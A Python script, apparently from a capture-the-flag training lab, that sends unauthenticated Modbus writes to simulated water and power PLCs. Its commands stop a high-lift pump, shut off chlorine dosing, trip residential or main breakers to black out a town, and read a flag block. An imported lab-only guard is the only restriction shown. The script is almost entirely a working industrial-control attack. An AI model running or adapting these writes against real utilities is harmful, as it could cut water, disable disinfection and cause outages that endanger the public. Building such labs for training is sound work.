#!/usr/bin/env python3
"""Unauthenticated Modbus writes against the Packet River field PLCs.

    modbus_attack.py water stop-pump      # stop the high-lift pump -> town loses water
    modbus_attack.py water dose-off       # stop chlorine dosing
    modbus_attack.py water flag           # set maint mode, read + decode the flag block
    modbus_attack.py water restore

    modbus_attack.py power trip <feeder>  # feeder: residential|business|industrial|streetlights
    modbus_attack.py power trip-main      # open the main incomer -> whole town dark
    modbus_attack.py power flag
    modbus_attack.py power restore

No auth, no validation - that is the lesson. Everything routes through the
lab-only guard first.
"""
import sys
import time

from pymodbus.client import ModbusTcpClient

sys.path.insert(0, "/opt/pktr/scripts")
from targets import guard  # noqa: E402

HOST = "field-plc"
WATER_PORT, POWER_PORT = 502, 503

W = dict(INTAKE=0, HIGHLIFT=1, CHLORINE=2, MAIN_VALVE=3, MAINT=8, HIGHLIFT_SP=0, CHLORINE_SP=1)
P = dict(MAIN=0, RES=1, BIZ=2, IND=3, ST=4, GEN=5, MAINT=8, GEN_SP=0)
FEEDER = {"residential": P["RES"], "business": P["BIZ"], "industrial": P["IND"], "streetlights": P["ST"]}
FLAG_BASE, FLAG_LEN = 100, 32


def client(port):
    guard(HOST)
    c = ModbusTcpClient(HOST, port=port, timeout=3)
    for _ in range(5):
        if c.connect():
            return c
        time.sleep(0.5)
    sys.exit(f"[!] cannot reach {HOST}:{port}")


def read_flag(c):
    # setting the maintenance-mode coil makes the PLC populate the flag block
    # on its next scan (~0.3s)
    c.write_coil(8, True, slave=1)
    time.sleep(0.5)
    regs = c.read_input_registers(FLAG_BASE, FLAG_LEN, slave=1).registers
    raw = bytes(x for r in regs for x in ((r >> 8) & 0xFF, r & 0xFF))
    return raw.split(b"\x00", 1)[0].decode(errors="replace")


def main():
    if len(sys.argv) < 3:
        sys.exit(__doc__)
    plant, action = sys.argv[1], sys.argv[2]

    if plant == "water":
        c = client(WATER_PORT)
        if action == "stop-pump":
            c.write_coil(W["HIGHLIFT"], False, slave=1); print("[+] high-lift pump stopped")
        elif action == "dose-off":
            c.write_coil(W["CHLORINE"], False, slave=1); print("[+] chlorine dosing stopped")
        elif action == "flag":
            print(read_flag(c))
        elif action == "restore":
            c.write_coils(0, [True, True, True, True], slave=1)
            c.write_registers(W["HIGHLIFT_SP"], [620, 120], slave=1)
            c.write_coil(W["MAINT"], False, slave=1); print("[+] water restored")
        else:
            sys.exit(f"unknown water action: {action}")
    elif plant == "power":
        c = client(POWER_PORT)
        if action == "trip":
            f = sys.argv[3] if len(sys.argv) > 3 else "industrial"
            c.write_coil(FEEDER[f], False, slave=1); print(f"[+] {f} feeder breaker opened")
        elif action == "trip-main":
            c.write_coil(P["MAIN"], False, slave=1); print("[+] main incomer breaker opened")
        elif action == "flag":
            print(read_flag(c))
        elif action == "restore":
            c.write_coils(0, [True] * 6, slave=1)
            c.write_registers(P["GEN_SP"], [80], slave=1)
            c.write_coil(P["MAINT"], False, slave=1); print("[+] power restored")
        else:
            sys.exit(f"unknown power action: {action}")
    else:
        sys.exit(f"unknown plant: {plant}")


if __name__ == "__main__":
    main()
